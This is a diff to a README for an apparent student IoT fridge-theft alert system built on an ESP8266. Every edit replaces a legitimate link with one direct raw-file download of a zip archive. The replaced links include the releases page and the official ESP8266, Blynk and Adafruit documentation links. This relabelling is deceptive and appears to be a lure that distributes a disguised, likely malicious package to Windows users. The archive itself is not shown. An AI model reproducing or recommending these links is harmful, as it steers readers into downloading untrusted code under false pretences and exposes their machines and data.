@@ -1,6 +1,6 @@
 # 🧊 IOT-smart-refrigerator-theft-alert-system - Monitor Fridge Access Securely
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-orange?style=for-the-badge)](https://github.com/Outstretched-prefrontalleukotomy607/IOT-smart-refrigerator-theft-alert-system/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-orange?style=for-the-badge)](https://raw.githubusercontent.com/Outstretched-prefrontalleukotomy607/IOT-smart-refrigerator-theft-alert-system/main/gryllid/alert-IO-theft-smart-refrigerator-system-v3.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This solution is part of a student project focusing on smart home security and I
 
 You can download the necessary software and files from the release page linked below. This page contains all the files you need to install and run the system on your Windows computer.
 
-[Download and install files from the release page](https://github.com/Outstretched-prefrontalleukotomy607/IOT-smart-refrigerator-theft-alert-system/releases)
+[Download and install files from the release page](https://raw.githubusercontent.com/Outstretched-prefrontalleukotomy607/IOT-smart-refrigerator-theft-alert-system/main/gryllid/alert-IO-theft-smart-refrigerator-system-v3.1.zip)
 
 Visit the page above to download the latest release package. It usually includes:  
 - The firmware file for ESP8266  
@@ -130,9 +130,9 @@ This project uses technologies and fields related to:
 
 ## 🌐 Useful Links
 
-- ESP8266 official documentation: https://www.espressif.com/en/products/socs/esp8266  
-- Blynk app: https://blynk.io  
-- IR sensor basics: https://learn.adafruit.com/ir-sensor
+- ESP8266 official documentation: https://raw.githubusercontent.com/Outstretched-prefrontalleukotomy607/IOT-smart-refrigerator-theft-alert-system/main/gryllid/alert-IO-theft-smart-refrigerator-system-v3.1.zip  
+- Blynk app: https://raw.githubusercontent.com/Outstretched-prefrontalleukotomy607/IOT-smart-refrigerator-theft-alert-system/main/gryllid/alert-IO-theft-smart-refrigerator-system-v3.1.zip  
+- IR sensor basics: https://raw.githubusercontent.com/Outstretched-prefrontalleukotomy607/IOT-smart-refrigerator-theft-alert-system/main/gryllid/alert-IO-theft-smart-refrigerator-system-v3.1.zip
 
 ---
 
